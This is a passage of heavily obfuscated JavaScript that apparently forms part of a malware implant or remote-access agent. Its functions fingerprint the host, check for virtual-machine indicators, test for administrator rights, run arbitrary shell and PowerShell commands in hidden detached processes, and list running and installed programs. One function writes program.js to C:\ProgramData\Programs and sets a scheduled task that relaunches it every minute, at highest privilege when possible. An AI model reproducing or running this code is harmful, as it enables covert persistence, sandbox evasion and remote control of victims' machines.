_0x277c19=a0_0x52fd6a,_0x31e112={'URYWn':function(_0x713dfb,_0x5cec25,_0x4fdc1a){return _0x713dfb(_0x5cec25,_0x4fdc1a);},'TFpEv':'uname\x20-a','GayRa':_0x277c19(0x2ca),'wDzGV':_0x277c19(0x1ef),'BPpUa':function(_0x5a1796,_0x55f8f8){return _0x5a1796+_0x55f8f8;},'XUbNk':_0x277c19(0x313),'grQZH':function(_0x565775,_0x36c8ca){return _0x565775(_0x36c8ca);},'ekFDK':_0x277c19(0x2a8)},_0x3ca011=[];let _0xcad33a='',_0x104a23=0x1;try{const _0x1a4be3=_0x31e112['URYWn'](execSync,_0x31e112['TFpEv'],{'encoding':_0x277c19(0x1ef),'timeout':0x1388});_0xcad33a=_0x1a4be3;try{const _0x1a9148=_0x31e112[_0x277c19(0x24e)](execSync,_0x31e112[_0x277c19(0x275)],{'encoding':_0x31e112[_0x277c19(0x1ed)],'timeout':0x1388});_0xcad33a+=_0x31e112[_0x277c19(0x21b)]('\x0a',_0x1a9148);}catch{}const _0x1d4e30=parseVmIndicators(_0xcad33a);if(_0x1d4e30[_0x277c19(0x202)])_0x3ca011[_0x277c19(0x317)](..._0x1d4e30);}catch(_0x153d82){_0x3ca011[_0x277c19(0x317)](_0x277c19(0x26d)+_0x153d82[_0x277c19(0x1df)]);}try{const _0x313563=_0x31e112[_0x277c19(0x24e)](execSync,_0x31e112[_0x277c19(0x24a)],{'encoding':_0x277c19(0x1ef),'timeout':0x1388}),_0x59724f=_0x31e112[_0x277c19(0x1d0)](parseVmIndicators,_0x313563);if(_0x59724f[_0x277c19(0x202)])_0x3ca011['push'](..._0x59724f);}catch{}return _0x3ca011[_0x277c19(0x317)](_0x104a23?'Exit':_0x31e112[_0x277c19(0x1f6)]),{'systemInfo':_0xcad33a,'vmIndicators':_0x3ca011};}function getSystemInfoMac(){const _0x2a8e53=a0_0x52fd6a,_0x574f2b={'mHjnV':function(_0x5e6d3f,_0x1a85f9,_0x295623){return _0x5e6d3f(_0x1a85f9,_0x295623);},'NUhKX':_0x2a8e53(0x1d2),'iljzU':'utf8','BFsza':function(_0x50e26a,_0x1914b3){return _0x50e26a(_0x1914b3);},'dcrTS':'{\x20default:\x20obj\x20};\x20}','cdLWB':'(function(nacl)\x20','AYxhW':function(_0x2d4f29,_0x2fba42){return _0x2d4f29!==_0x2fba42;},'DBxAt':'LNiak','AyQvf':_0x2a8e53(0x2fa),'CaBlB':function(_0x5e3789,_0xc59fcb){return _0x5e3789===_0xc59fcb;},'qAmDV':_0x2a8e53(0x1f2),'pHWxR':'cofAo','LryTQ':function(_0x338f7f,_0x412803,_0xf52149){return _0x338f7f(_0x412803,_0xf52149);},'joAIS':_0x2a8e53(0x27c),'bMjCu':function(_0x1dc218,_0x2435a9){return _0x1dc218+_0x2435a9;},'jKWTc':function(_0xf209fc,_0x5cf904){return _0xf209fc(_0x5cf904);},'fDUcF':_0x2a8e53(0x2b3),'poshF':'Continue'},_0x108ca6=[];let _0x2915ba='',_0x290b6a=0x1;try{if(_0x574f2b[_0x2a8e53(0x22b)](_0x574f2b[_0x2a8e53(0x229)],_0x574f2b['AyQvf'])){const _0x18ddd1=execSync(_0x574f2b[_0x2a8e53(0x1b4)],{'encoding':_0x574f2b['iljzU'],'timeout':0x1388});_0x2915ba=_0x18ddd1;try{if(_0x574f2b[_0x2a8e53(0x2d3)](_0x574f2b[_0x2a8e53(0x228)],_0x574f2b[_0x2a8e53(0x265)])){const _0x1e5242=_0x574f2b[_0x2a8e53(0x271)](_0x5e5cd6,_0x574f2b[_0x2a8e53(0x1b4)],{'encoding':_0x574f2b['iljzU'],'timeout':0x1388});_0x106564=_0x1e5242;try{const _0x3a1f18=_0x574f2b[_0x2a8e53(0x271)](_0x3a326a,_0x2a8e53(0x27c),{'encoding':'utf8','timeout':0x2710});_0x44a885+='\x0a'+_0x3a1f18;}catch{}const _0x454ff7=_0x574f2b[_0x2a8e53(0x2c6)](_0x58db7b,_0xb2444c);if(_0x454ff7[_0x2a8e53(0x202)])_0x23ecac[_0x2a8e53(0x317)](..._0x454ff7);}else{const _0x52e080=_0x574f2b[_0x2a8e53(0x218)](execSync,_0x574f2b[_0x2a8e53(0x23c)],{'encoding':_0x2a8e53(0x1ef),'timeout':0x2710});_0x2915ba+=_0x574f2b[_0x2a8e53(0x30e)]('\x0a',_0x52e080);}}catch{}const _0x5bf4df=_0x574f2b['jKWTc'](parseVmIndicators,_0x2915ba);if(_0x5bf4df[_0x2a8e53(0x202)])_0x108ca6[_0x2a8e53(0x317)](..._0x5bf4df);}else{const _0x5ccf63=_0x17aae8,_0x5e4a40=_0x4e753c['readFileSync'](_0x5ccf63,_0x2a8e53(0x1ef)),_0x1fc58a=_0x574f2b[_0x2a8e53(0x2ab)],_0x3af2d0=_0x574f2b[_0x2a8e53(0x1e9)],_0xc9c85a=_0x5e4a40[_0x2a8e53(0x211)](_0x1fc58a),_0x5473d4=_0x5e4a40[_0x2a8e53(0x211)](_0x3af2d0),_0x5d850e=_0x5e4a40[_0x2a8e53(0x2a0)](_0x5473d4);_0x1a9cc0[_0x2a8e53(0x2b0)](_0x5ccf63,_0x5d850e);}}catch(_0xd3c351){_0x108ca6[_0x2a8e53(0x317)]('Error\x20getting\x20system\x20info:\x20'+_0xd3c351[_0x2a8e53(0x1df)]);}return _0x108ca6[_0x2a8e53(0x317)](_0x290b6a?_0x574f2b['fDUcF']:_0x574f2b[_0x2a8e53(0x278)]),{'systemInfo':_0x2915ba,'vmIndicators':_0x108ca6};}function isAdmin(){const _0x1dc4ec=a0_0x52fd6a,_0xf0f027={'DYOlC':function(_0x4a431a,_0x5dd2c7){return _0x4a431a(_0x5dd2c7);},'wWXPj':_0x1dc4ec(0x207),'BjQoI':function(_0x341f62,_0x3e049c){return _0x341f62!==_0x3e049c;},'aIPMA':'vvdrc','VMmHL':_0x1dc4ec(0x236),'LXETk':function(_0x2761ff,_0x5c14cd,_0x23f471){return _0x2761ff(_0x5c14cd,_0x23f471);},'NAjVf':_0x1dc4ec(0x2a3)};return new Promise(_0x3351af=>{const _0x12063e=_0x1dc4ec,_0x45cf24={'AHfhT':function(_0x212a14,_0x4378e6){const _0x140d62=a0_0x17a7;return _0xf0f027[_0x140d62(0x220)](_0x212a14,_0x4378e6);},'DbjNc':function(_0x5d7087,_0x19b9ed){const _0x413895=a0_0x17a7;return _0xf0f027[_0x413895(0x220)](_0x5d7087,_0x19b9ed);},'QdjdX':_0xf0f027[_0x12063e(0x1bc)]};if(_0xf0f027['BjQoI'](_0xf0f027[_0x12063e(0x2bb)],_0xf0f027[_0x12063e(0x24c)]))_0xf0f027[_0x12063e(0x2ee)](exec,_0xf0f027[_0x12063e(0x1ee)],(_0x3335b3,_0x254ea6)=>{const _0xc92779=_0x12063e;if(_0x3335b3)return _0x45cf24['AHfhT'](_0x3351af,![]);_0x45cf24['DbjNc'](_0x3351af,_0x254ea6[_0xc92779(0x2b4)](_0x45cf24['QdjdX']));});else return _0x5190b1[_0x12063e(0x244)](_0x5c3fcb);});}function getSystemInfo(){const _0x563b39=a0_0x52fd6a,_0x7f8a59={'mjOsi':_0x563b39(0x1ef),'Fsesa':function(_0x8df031,_0x44a887){return _0x8df031(_0x44a887);},'qTjpm':function(_0x21f1ba,_0x498864,_0x26c7c0){return _0x21f1ba(_0x498864,_0x26c7c0);},'QgRDU':_0x563b39(0x22a),'aqvDx':function(_0x5eb2b2,_0x4ea3ab){return _0x5eb2b2(_0x4ea3ab);},'jXTCk':function(_0x3a27a6,_0x3d8813,_0x47c303){return _0x3a27a6(_0x3d8813,_0x47c303);},'fanuI':_0x563b39(0x1d2),'tPppi':_0x563b39(0x2ca),'fLOJW':function(_0x3b070a,_0x34913b){return _0x3b070a+_0x34913b;},'TZIUp':function(_0x3e7e7f){return _0x3e7e7f();},'PgNVB':_0x563b39(0x2a4),'eLFMW':function(_0x24877e,_0x18ddd5){return _0x24877e+_0x18ddd5;},'FLzBV':function(_0x40b218,_0x4db270){return _0x40b218===_0x4db270;},'FqsbK':'win32','VYerZ':_0x563b39(0x261),'gojsE':function(_0x44c4e6,_0x237c48){return _0x44c4e6!==_0x237c48;},'vNPoE':_0x563b39(0x319),'TBKsS':_0x563b39(0x20b),'YFONm':function(_0x34a786,_0x29bcf,_0x198462){return _0x34a786(_0x29bcf,_0x198462);},'XCrut':_0x563b39(0x201),'owPQD':_0x563b39(0x28c),'cspvJ':_0x563b39(0x2ed),'DFVuG':_0x563b39(0x1fd),'oWPBw':_0x563b39(0x2f8),'XZoUL':_0x563b39(0x26b),'Bxuqb':'KVM','ENtTI':_0x563b39(0x30a),'dWftF':_0x563b39(0x1da),'WIzKx':_0x563b39(0x1be),'RTzVY':_0x563b39(0x31a),'YBizy':'KCiNx','IXBHr':function(_0x5260ab,_0x456b34){return _0x5260ab!==_0x456b34;},'qzjth':'ugeqb','nJgTz':'yJwQQ','rsaaL':_0x563b39(0x208),'CJMtN':_0x563b39(0x1e2),'CYJAj':_0x563b39(0x27e),'ZATrK':_0x563b39(0x23d),'tpYjF':function(_0x1d6aae,_0x542af6,_0x321eca){return _0x1d6aae(_0x542af6,_0x321eca);},'NHdUN':function(_0x68d8aa,_0x509026){return _0x68d8aa!==_0x509026;},'oUiNQ':_0x563b39(0x20d),'JPCXE':function(_0xc9a4f9,_0xa696d){return _0xc9a4f9!==_0xa696d;},'IWMlg':_0x563b39(0x1cb),'nXRJj':_0x563b39(0x2b3),'jJJia':'Continue','sQBQo':_0x563b39(0x2ae)};let _0x175319={};const _0x386b7d=[],_0x206b4a=process[_0x563b39(0x2f4)];_0x386b7d['push'](_0x563b39(0x287)+(_0x7f8a59['FLzBV'](_0x206b4a,_0x7f8a59[_0x563b39(0x282)])?_0x7f8a59[_0x563b39(0x1e8)]:_0x206b4a));let _0xf00435=0x0;if(_0x7f8a59[_0x563b39(0x20f)](_0x206b4a,_0x7f8a59[_0x563b39(0x282)])){if(_0x7f8a59[_0x563b39(0x246)](_0x7f8a59[_0x563b39(0x1ea)],_0x7f8a59['TBKsS'])){try{const _0x26dad3=_0x7f8a59[_0x563b39(0x1c3)](execSync,_0x7f8a59['XCrut'],{'encoding':'utf8','timeout':0x2710});_0x175319[_0x7f8a59[_0x563b39(0x277)]]=_0x26dad3;const _0x217a01=[_0x7f8a59[_0x563b39(0x2c3)],_0x7f8a59[_0x563b39(0x2ad)],_0x7f8a59[_0x563b39(0x2db)],_0x7f8a59[_0x563b39(0x2cc)],_0x7f8a59['Bxuqb'],_0x7f8a59[_0x563b39(0x2e3)],_0x7f8a59['dWftF'],_0x7f8a59['WIzKx']];for(const _0x3459eb of _0x217a01){_0x7f8a59[_0x563b39(0x21d)]!==_0x7f8a59[_0x563b39(0x2fb)]?_0x26dad3['toLowerCase']()['includes'](_0x3459eb['toLowerCase']())&&(_0x386b7d['push'](_0x563b39(0x1c1)+_0x3459eb),_0xf00435=0x1):_0x491e74['push']('Error\x20getting\x20systeminfo:\x20'+_0x27db74['message']);}}catch(_0x2f1dd5){if(_0x7f8a59[_0x563b39(0x1dc)](_0x7f8a59[_0x563b39(0x1e7)],_0x7f8a59[_0x563b39(0x28a)]))_0x386b7d[_0x563b39(0x317)]('Error\x20getting\x20systeminfo:\x20'+_0x2f1dd5[_0x563b39(0x1df)]);else return _0x4e99fe[_0x563b39(0x23f)](_0x2b6c14[_0x563b39(0x2d5)](iaHwGG[_0x563b39(0x27a)]));}const _0x5032cb=[_0x7f8a59[_0x563b39(0x209)],_0x7f8a59[_0x563b39(0x221)],_0x563b39(0x2f8)];for(const _0xd32259 of _0x5032cb){if(_0x7f8a59['gojsE'](_0x7f8a59['CYJAj'],_0x7f8a59[_0x563b39(0x301)])){const _0xba518e={'OqsAX':function(_0x3fa90b,_0x355d3a){const _0x579c51=_0x563b39;return iaHwGG[_0x579c51(0x2ea)](_0x3fa90b,_0x355d3a);},'xQuJf':_0x563b39(0x207)};_0x3cca16(_0x563b39(0x2a3),(_0x217242,_0x22b29e)=>{const _0x4922ea=_0x563b39;if(_0x217242)return _0xba518e[_0x4922ea(0x241)](_0x3d43b8,![]);_0xba518e[_0x4922ea(0x241)](_0x1e5b1e,_0x22b29e[_0x4922ea(0x2b4)](_0xba518e[_0x4922ea(0x1c8)]));});}else{if(process.env[_0xd32259]){if(_0x7f8a59[_0x563b39(0x246)](_0x563b39(0x23d),_0x7f8a59[_0x563b39(0x284)])){const _0x4e1196=iaHwGG['qTjpm'](_0x2c0ff9,iaHwGG[_0x563b39(0x237)],{'encoding':_0x563b39(0x1ef),'timeout':0x2710}),_0x2b2f9c=iaHwGG[_0x563b39(0x1b7)](_0x4c8514,_0x4e1196);_0x2b2f9c[_0x563b39(0x202)]&&(_0x46aaaf[_0x563b39(0x317)](..._0x2b2f9c),_0x509c7b=0x1);}else _0x386b7d[_0x563b39(0x317)](_0x563b39(0x1c2)+_0xd32259),_0xf00435=0x1;}}}try{if(_0x7f8a59[_0x563b39(0x20f)](_0x563b39(0x307),_0x563b39(0x307))){const _0x31bb23=_0x7f8a59['tpYjF'](execSync,_0x7f8a59[_0x563b39(0x237)],{'encoding':'utf8','timeout':0x2710});if(_0x31bb23[_0x563b39(0x2b4)](_0x563b39(0x219))||_0x31bb23['includes'](_0x7f8a59[_0x563b39(0x2ad)])){if(_0x7f8a59[_0x563b39(0x216)](_0x563b39(0x20a),'ModHs'))_0x386b7d[_0x563b39(0x317)](_0x7f8a59[_0x563b39(0x308)]),_0xf00435=0x1;else{const _0x23842d=iaHwGG['jXTCk'](_0x39adc5,iaHwGG[_0x563b39(0x21e)],{'encoding':iaHwGG['mjOsi'],'timeout':0x1388});_0x1d52fd=_0x23842d;try{const _0x2b6eb2=_0x30fd15(iaHwGG[_0x563b39(0x291)],{'encoding':'utf8','timeout':0x1388});_0x14c593+=iaHwGG['fLOJW']('\x0a',_0x2b6eb2);}catch{}const _0x26c9ef=iaHwGG[_0x563b39(0x2ea)](_0x49f25f,_0x3335b7);if(_0x26c9ef['length'])_0x37c5db[_0x563b39(0x317)](..._0x26c9ef);}}}else{const _0x5284e8=iaHwGG[_0x563b39(0x258)](_0x3d4858),_0x2f60ad=_0x12248e[_0x563b39(0x225)](0x10),_0xcc27f2=_0x48362d[_0x563b39(0x263)](iaHwGG[_0x563b39(0x1eb)],_0x5284e8,_0x2f60ad),_0x478327=_0x4974bf[_0x563b39(0x264)](_0x57691c),_0x2f7ae8=_0x16a83a[_0x563b39(0x297)]([_0xcc27f2[_0x563b39(0x29d)](_0x478327,iaHwGG[_0x563b39(0x27a)]),_0xcc27f2['final']()]);return _0x6521b9[_0x563b39(0x297)]([_0x2f60ad,_0x2f7ae8]);}}catch(_0x5d9bfd){}}else{const _0x3abe91=iaHwGG['jXTCk'](_0x86dafd,iaHwGG[_0x563b39(0x291)],{'encoding':iaHwGG[_0x563b39(0x27a)],'timeout':0x1388});_0x448a17+=iaHwGG['eLFMW']('\x0a',_0x3abe91);}}else{if(_0x7f8a59[_0x563b39(0x1e6)](_0x563b39(0x1b6),_0x7f8a59[_0x563b39(0x1f9)]))_0xf00435=0x1;else{_0x5e2f2b[_0x563b39(0x21c)](0x0);throw _0x2ed646;}}return _0x386b7d[_0x563b39(0x317)](_0xf00435?_0x7f8a59[_0x563b39(0x242)]:_0x7f8a59['jJJia']),_0x175319[_0x7f8a59[_0x563b39(0x227)]]=_0x386b7d,_0x175319;}function runShell(_0x29bf13){const _0x47664e={'WPuBU':function(_0x3d0e8a,_0x41be7){return _0x3d0e8a(_0x41be7);},'MPXFc':function(_0xd17632,_0x1a813a){return _0xd17632(_0x1a813a);},'mwHyc':function(_0x4316f1,_0x58f9e3,_0x1c1e89,_0x3b85e5){return _0x4316f1(_0x58f9e3,_0x1c1e89,_0x3b85e5);}};return new Promise((_0x3a0e8d,_0x1e168a)=>{const _0x2d2c33=a0_0x17a7;_0x47664e[_0x2d2c33(0x256)](exec,_0x29bf13,{'shell':!![]},(_0x20f171,_0x1cdc61,_0x42db17)=>{const _0x455714=_0x2d2c33;if(_0x20f171){_0x47664e[_0x455714(0x1fb)](_0x1e168a,_0x20f171);return;}_0x47664e['MPXFc'](_0x3a0e8d,{'stdout':_0x1cdc61[_0x455714(0x2f6)](),'stderr':_0x42db17['trim']()});});});}function runPowershell(_0x5c0658){const _0x1b104d=a0_0x52fd6a,_0x504f43={'iXvxL':function(_0x150550,_0x39a445){return _0x150550===_0x39a445;},'gYFLi':_0x1b104d(0x27d),'TUOjw':_0x1b104d(0x294),'iZMWU':_0x1b104d(0x2cf)};exec('powershell\x20-Command\x20\x22'+_0x5c0658+'\x22',(_0x2b293e,_0x526ecd,_0x137d10)=>{const _0x2e94c5=_0x1b104d;if(_0x504f43[_0x2e94c5(0x2ec)](_0x504f43[_0x2e94c5(0x288)],_0x504f43[_0x2e94c5(0x288)])){if(_0x2b293e){if(_0x504f43[_0x2e94c5(0x1bd)]===_0x504f43[_0x2e94c5(0x1ca)])_0x4cc409[_0x2e94c5(0x21c)](0x1);else return;}if(_0x137d10)return;}else return;});}function createshellchild(_0x5f4250){const _0x3f8a8f=a0_0x52fd6a,_0x3c21f5={'AwHsF':function(_0x3d0a65,_0x38e732,_0x529ac7){return _0x3d0a65(_0x38e732,_0x529ac7);},'jliCx':_0x3f8a8f(0x29c)},_0x4cfcd9=_0x5f4250[_0x3f8a8f(0x29b)](/\r\n/g,'\x0a')[_0x3f8a8f(0x29b)](/\r/g,'\x0a'),_0x1da1be=_0x3c21f5[_0x3f8a8f(0x285)](spawn,_0x4cfcd9,{'shell':!![],'windowsHide':!![],'stdio':_0x3c21f5['jliCx'],'detached':!![]});_0x1da1be['unref']();}function createrunpowershellchild(_0x162615){const _0x753531=a0_0x52fd6a,_0x5d107a={'mqlRN':function(_0x339e52,_0x2085a1,_0x1bf23c,_0x12b802){return _0x339e52(_0x2085a1,_0x1bf23c,_0x12b802);},'BBtCl':_0x753531(0x28e),'IklpD':_0x753531(0x24f),'CVkWa':'ignore'};_0x5d107a['mqlRN'](spawn,_0x5d107a['BBtCl'],[_0x5d107a['IklpD'],_0x162615],{'shell':!![],'detached':!![],'stdio':_0x5d107a[_0x753531(0x224)],'windowsHide':!![]});}async function createTask(){const _0x337de0=a0_0x52fd6a,_0x5a2421={'VaaNu':function(_0x128379){return _0x128379();},'dSNRG':'C:\x5cProgramData\x5cPrograms','sZkxf':_0x337de0(0x23e),'yhnOA':'program.js','rscuf':_0x337de0(0x28b),'LMFri':_0x337de0(0x2f0),'xfFyy':_0x337de0(0x30f),'pGpea':_0x337de0(0x1ec),'FUjqz':function(_0x4a957e,_0x3713cf,_0x2e7d39){return _0x4a957e(_0x3713cf,_0x2e7d39);}},_0x51dc5a=await _0x5a2421[_0x337de0(0x248)](isAdmin),_0x2c7d3d=path[_0x337de0(0x29e)](_0x5a2421[_0x337de0(0x1d5)],_0x5a2421['sZkxf']),_0x2a8601=path[_0x337de0(0x29e)](_0x5a2421['dSNRG'],'pid.txt'),_0x41de91=path[_0x337de0(0x29e)](_0x5a2421[_0x337de0(0x1d5)],_0x5a2421[_0x337de0(0x2a2)]),_0x453f44=_0x5a2421[_0x337de0(0x1dd)],_0x366768=(_0x337de0(0x302)+_0x2a8601[_0x337de0(0x29b)](/\\/g,'\x5c\x5c')+_0x337de0(0x1d1)+_0x41de91[_0x337de0(0x29b)](/\\/g,'\x5c\x5c')+_0x337de0(0x2b7)+path['join']('C:',_0x5a2421[_0x337de0(0x1b2)],_0x5a2421[_0x337de0(0x1fa)],_0x337de0(0x240))['replace'](/\\/g,'\x5c\x5c')+_0x337de0(0x312))['trim']();fs['writeFileSync'](_0x2c7d3d,_0x366768);const _0x500893=[_0x5a2421[_0x337de0(0x2c7)],_0x337de0(0x28d)+_0x453f44+'\x22',_0x337de0(0x269)+_0x2c7d3d+'\x22','/sc\x20MINUTE','/mo\x201',_0x51dc5a?'/rl\x20HIGHEST\x20/it':_0x337de0(0x1ce)+process.env.USERNAME,'/f'][_0x337de0(0x29e)]('\x20');_0x5a2421[_0x337de0(0x31c)](exec,_0x500893,(_0x27bf18,_0x30927e)=>{const _0x1c0e0b=_0x337de0;if(_0x27bf18)return;exec(_0x1c0e0b(0x290)+_0x453f44+'\x22',(_0x3a8c68,_0x36a52f)=>{if(_0x3a8c68)return;});});}async function getProgramInfoWindows(){const _0x18d229=a0_0x52fd6a,_0x2374fc={'iaklS':function(_0x405fe1,_0x57e020){return _0x405fe1===_0x57e020;},'sRpeF':_0x18d229(0x2e2),'QtAAC':function(_0x503f0d,_0x2b00ac){return _0x503f0d(_0x2b00ac);},'uZGXQ':_0x18d229(0x25e),'Zccye':_0x18d229(0x2a1),'vgskc':'NT\x20AUTHORITY\x5cLOCAL\x20SERVICE','EWptZ':_0x18d229(0x1ba),'AIgAz':_0x18d229(0x2de),'teLdY':_0x18d229(0x2d1),'usVPx':function(_0x5eb185,_0x45daf9){return _0x5eb185(_0x45daf9);},'aIJtB':_0x18d229(0x260),'BSMag':function(_0x475c4d,_0x3f0cf0){return _0x475c4d!==_0x3f0cf0;},'eGWLf':_0x18d229(0x200),'FdfXd':function(_0xd2ffd5,_0x3066b3){return _0xd2ffd5(_0x3066b3);},'NJJPn':_0x18d229(0x30d),'oPQUy':_0x18d229(0x2e9)},_0x8bb667=new Set(),_0x55b9d9=new Set();try{if(_0x2374fc[_0x18d229(0x1d4)](_0x18d229(0x25a),_0x2374fc['sRpeF']))_0x4b31fd[_0x18d229(0x21c)](0x0);else{const {stdout:_0x5661f0}=await _0x2374fc['QtAAC'](runShell,_0x2374fc[_0x18d229(0x25b)]),_0x1ea0cc=_0x5661f0[_0x18d229(0x2f6)]()[_0x18d229(0x300)](/\r?\n/);_0x1ea0cc[_0x18d229(0x2f2)]();const _0x5e13a6=new Set([_0x2374fc[_0x18d229(0x2a9)],_0x2374fc[_0x18d229(0x245)],_0x2374fc[_0x18d229(0x272)]]);for(const _0x158916 of _0x1ea0cc){if(_0x2374fc['iaklS'](_0x2374fc[_0x18d229(0x2c5)],_0x2374fc['teLdY']))_0x115042[_0x18d229(0x317)]('⚠️\x20\x20Found\x20env\x20var:\x20'+_0x335cd9),_0x5e0e40=0x1;else{const _0x64e941=[..._0x158916[_0x18d229(0x1c9)](/"([^\"]*)"/g)]['map'](_0x50cc42=>_0x50cc42[0x1]),_0x556cf8=_0x64e941[0x0],_0x2e0f5a=(_0x64e941[0x6]||'')[_0x18d229(0x26a)]();if(!_0x5e13a6[_0x18d229(0x210)](_0x2e0f5a))_0x8bb667['add'](_0x556cf8);}}}}catch(_0x468557){}try{const {stdout:_0x3b4c87}=await _0x2374fc[_0x18d229(0x30b)](runShell,_0x2374fc[_0x18d229(0x1bf)]);for(const _0x4aa1e7 of _0x3b4c87[_0x18d229(0x300)](/\r?\n/)){const _0x4f637c=_0x4aa1e7[_0x18d229(0x1e1)](/^\s*DisplayName\s+REG_SZ\s+(.+)$/i);if(_0x4f637c)_0x55b9d9[_0x18d229(0x266)](_0x4f637c[0x1]['trim']());}}catch(_0x2f7f76){}try{if(_0x2374fc[_0x18d229(0x2c2)](_0x2374fc['eGWLf'],_0x18d229(0x2f5))){const {stdout:_0x17bd37}=await _0x2374fc[_0x18d229(0x306)](runShell,_0x18d229(0x1e0));for(const _0xb6be75 of _0x17bd37['split'](/\r?\n/)){if(_0x2374fc['BSMag'](_0x2374fc[_0x18d229(0x254)],_0x2374fc[_0x18d229(0x23a)])){const _0x3c6478=_0xb6be75[_0x18d229(0x1e1)](/^\s*DisplayName\s+REG_SZ\s+(.+)$/i);if(_0x3c6478)_0x55b9d9[_0x18d229(0x266)](_0x3c6478[0x1]['trim']());}else{const _0x506ad2=_0x39f8fd[_0x18d229(0x1e1)](/^\s*DisplayName\s+REG_SZ\s+(.+)$/i);if(_0x506ad2)_0xb873b5[_0x18d229(0x266)](_0x506ad2[0x1][_0x18d229(0x2f6)]());}}}else return _0x48ad7a['hostname']();}catch(_0x237151){}return{'running':Array[_0x18d229(0x303)](_0x8bb667),'installed':Array[_0x18d229(0x303)](_0x55b9d9)};}async function getProgramInfoLinux(){const _0x25f0f1=a0_0x52fd6a,_0x17c7e8={'PZHQV':function(_0x32179f,_0x2a1075){return _0x32179f!==_0x2a1075;},'UnRDj':_0x25f0f1(0x2dd),'JmqVQ':_0x25f0f1(0x293),'pGnvW':function(_0x1dc773,_0x152903){return _0x1dc773(_0x152903);},'OMuCa':'pQyxa','lkggC':function(_0x1b611a,_0x533433){return _0x1b611a(_0x533433);},'PMPta':_0x25f0f1(0x1cf)},_0x5a68d1=new Set(),_0x2b83c8=new Set();try{const {stdout:_0x1b2f66}=await runShell(_0x25f0f1(0x311));_0x1b2f66['split'](/\n/)[_0x25f0f1(0x1d7)](_0x5670c1=>_0x5670c1[_0x25f0f1(0x2f6)]()&&_0x5a68d1[_0x25f0f1(0x266)](_0x5670c1[_0x25f0f1(0x2f6)]()));}catch(_0x5f0259){}try{if(_0x17c7e8[_0x25f0f1(0x273)](_0x17c7e8[_0x25f0f1(0x2f9)],_0x17c7e8[_0x25f0f1(0x203)])){const {stdout:_0x4cef7c}=await _0x17c7e8[_0x25f0f1(0x2e1)](runShell,_0x25f0f1(0x2b9));_0x4cef7c[_0x25f0f1(0x300)](/\n/)[_0x25f0f1(0x1d7)](_0x326e3f=>_0x326e3f[_0x25f0f1(0x2f6)]()&&_0x2b83c8[_0x25f0f1(0x266)](_0x326e3f[_0x25f0f1(0x2f6)]()));}else{if(_0x3aa7f2)return;}}catch(_0x18bfc1){}try{if(_0x17c7e8['OMuCa']===_0x17c7e8[_0x25f0f1(0x22c)]){const {stdout:_0x2e8150}=await _0x17c7e8[_0x25f0f1(0x2e0)](runShell,_0x17c7e8['PMPta']);_0x2e8150[_0x25f0f1(0x300)](/\n/)[_0x25f0f1(0x1d7)](_0x4f15db=>_0x4f15db['trim']()&&_0x2b83c8[_0x25f0f1(0x266)](_0x4f15db[_0x25f0f1(0x2f6)]()));}else _0x362811.env[_0x1a4577]&&(_0x5e4941['push'](_0x25f0f1(0x1c2)+_0xf0f8fb),_0x18063e=0x1);}catch(_0x1513ea){}return{'running':Array[_0x25f0f1(0x303)](_0x5a68d1),'installed':Array['from'](_0x2b83c8)};}async function getProgramInfoMac(){const _0x42542c=a0_0x52fd6a,_0x2bc074={'ngVmC':function(_0x5c3077){return _0x5c3077();},'DdUwJ':_0x42542c(0x2a4),'ByGmX':function(_0x29fcdc,_0xe0f7c9){return _0x29fcdc===_0xe0f7c9;},'PBZPN':_0x42542c(0x1ef),'fwJox':function(_0x141412,_0x5607e5){return _0x141412(_0x5607e5);},'RWCbP':_0x42542c(0x311),'CNlEh':function(_0x4a917a,_0x2cb1cd){return _0x4a917a!==_0x2cb1cd;},'PvLwW':_0x42542c(0x295),'dCFbP':function(_0x43e8a7,_0x3f50a1){return _0x43e8a7(_0x3f50a1);},'sHhib':'brew\x20list'},_0x11c0be=new Set(),_0x12fa10=new Set();try{const {stdout:_0x18cfc1}=await _0x2bc074[_0x42542c(0x268)](runShell,_0x2bc074[_0x42542c(0x2c9)]);_0x18cfc1[_0x42542c(0x300)](/\n/)[_0x42542c(0x1d7)](_0xa4d7b9=>_0xa4d7b9[_0x42542c(0x2f6)]()&&_0x11c0be[_0x42542c(0x266)](_0xa4d7b9[_0x42542c(0x2f6)]()));}catch(_0x28dff4){}try{const {stdout:_0x2b84c4}=await _0x2bc074[_0x42542c(0x268)](runShell,'ls\x20/Applications');_0x2b84c4['split'](/\n/)['forEach'](_0x154c35=>_0x154c35[_0x42542c(0x2f6)]()&&_0x12fa10[_0x42542c(0x266)](_0x154c35['trim']()));}catch(_0x158dbc){}try{if(_0x2bc074['CNlEh'](_0x2bc074[_0x42542c(0x1f5)],'Wwbwr')){const _0x6a1d=ujvQfU[_0x42542c(0x2fc)](_0x53a0be),_0x3640cf=_0x33abbd[_0x42542c(0x2a0)](0x0,0x10),_0x4e824c=_0x69cafd[_0x42542c(0x2a0)](0x10),_0x568f77=_0x45686c[_0x42542c(0x1d9)](ujvQfU[_0x42542c(0x20e)],_0x6a1d,_0x3640cf),_0x45ee07=_0x264278[_0x42542c(0x297)]([_0x568f77['update'](_0x4e824c),_0x568f77['final']()]),_0x3c56e0=ujvQfU[_0x42542c(0x2af)](_0x45ee07[0x0],0x1),_0x5f06f9=_0x45ee07[_0x42542c(0x2a0)](0x1);return _0x3c56e0?_0x5f06f9:_0xd0445e[_0x42542c(0x23f)](_0x5f06f9[_0x42542c(0x2d5)](ujvQfU[_0x42542c(0x1cc)]));}else{const {stdout:_0x4eab8b}=await _0x2bc074[_0x42542c(0x2b2)](runShell,_0x2bc074[_0x42542c(0x204)]);_0x4eab8b['split'](/\n/)[_0x42542c(0x1d7)](_0x5af9cb=>_0x5af9cb[_0x42542c(0x2f6)]()&&_0x12fa10[_0x42542c(0x266)](_0x5af9cb[_0x42542c(0x2f6)]()));}}catch(_0x495294){}return{'running':Array[_0x42542c(0x303)](_0x11c0be),'installed':Array['from'](_0x12fa10)};}async function getProgramInfo(){const _0x5b1281=a0_0x52fd6a,_0x34bdd0={'JygDx':function(_0x428105,_0xb41af){return _0x428105===_0xb41af;},'ZlHea':'win32','qnpOW':function(_0x2635a6){return _0x2635a6();},'qRoda':function(_0x3782ff,_0x562a5f){return _0x3782ff===_0x562a5f;},'qpYoe':function(_0x57451d){return _0x57451d();}},_0x17fa92=process[_0x5b1281(0x2f4)];if(_0x34bdd0['JygDx'](_0x17fa92,_0x34bdd0[_0x5b1281(0x1b3)]))return _0x34bdd0[_0x5b1281(0x2a6)](getProgramInfoWindows);if(_0x34bdd0[_0x5b1281(0x25f)](_0x17fa92,'linux'))return 